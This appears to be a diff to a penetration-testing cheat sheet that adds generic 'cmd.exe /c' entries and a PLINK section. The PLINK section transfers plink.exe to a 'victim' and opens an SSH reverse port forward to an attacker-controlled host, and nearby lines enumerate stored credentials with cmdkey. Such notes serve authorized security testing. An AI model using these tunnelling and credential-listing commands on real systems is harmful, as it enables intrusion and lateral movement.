@@ -813,6 +813,9 @@ cls
 # list stored credentials
 cmdkey /list
 
+# execute commands
+cmd.exe /c command_here
+
 # enumerate hidden files
 dir -ah
 dir /ah
@@ -2522,6 +2525,15 @@ pipreqs --force
 
 
 
+## PLINK
+```
+# transfer plink.exe to victim, e.g. with certutil
+# forward port remotely from attacker_IP to Windows box
+cmd.exe /c echo y | plink.exe -ssh -l user_name_here -pw password_here -R attacker_IP_here:listening_port_here:127.0.0.1:service_port_here attacker_IP_here
+```
+
+
+
 ## POP3
 ```bash
 # connect
@@ -2590,6 +2602,9 @@ powershell -E content_of_outfile.ps1
 
 ## POWERSHELL
 ```powershell
+# execute commands via cmd
+cmd.exe /c command_here
+
 # print powershell version
 echo $PSVersionTable
 
